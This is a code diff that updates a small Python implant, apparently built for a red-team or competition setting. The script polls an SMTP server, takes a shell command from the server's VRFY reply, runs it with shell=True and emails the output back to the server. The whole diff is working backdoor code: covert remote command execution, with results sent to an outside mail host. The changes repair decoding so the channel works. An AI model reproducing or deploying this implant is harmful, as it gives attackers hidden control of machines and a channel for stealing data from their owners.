@@ -12,7 +12,7 @@ import smtplib
 import socket
 import subprocess
 import getpass
-SERVER = "mail2.teamX"
+SERVER = "localhost"
 DEST_ADDR = "mailman@"+SERVER
 
 def main():
@@ -23,11 +23,20 @@ def main():
     # machineIP = socket.gethostbyname_ex(socket.gethostname())[-1][-1] #Tested on windows
     machineIP = socket.getfqdn() #should get full hostname/domain name
     emailAddr = username + "@" + machineIP
-    command = connection.verify(emailAddr) #tuple of code and string response
-    if(command[0] != 250):
+    code,command = connection.verify(emailAddr) #tuple of code and string response
+    if(code != 250):
         return #Wait for next run
-    out = subprocess.Popen(command[1], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, shell=True)
+    command = command.decode("UTF-8")
+    out = subprocess.Popen([command], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, shell=True)
     (stdout, stderr) = out.communicate()
+    if stdout != None:
+        stdout = stdout.decode("UTF-8")
+    else:
+        stdout = ""
+    if stderr != None:
+        stderr = stderr.decode("UTF-8")
+    else:
+        stderr = ""
     connection.sendmail(emailAddr, DEST_ADDR, stdout+"\n"+stderr)
 
 main()
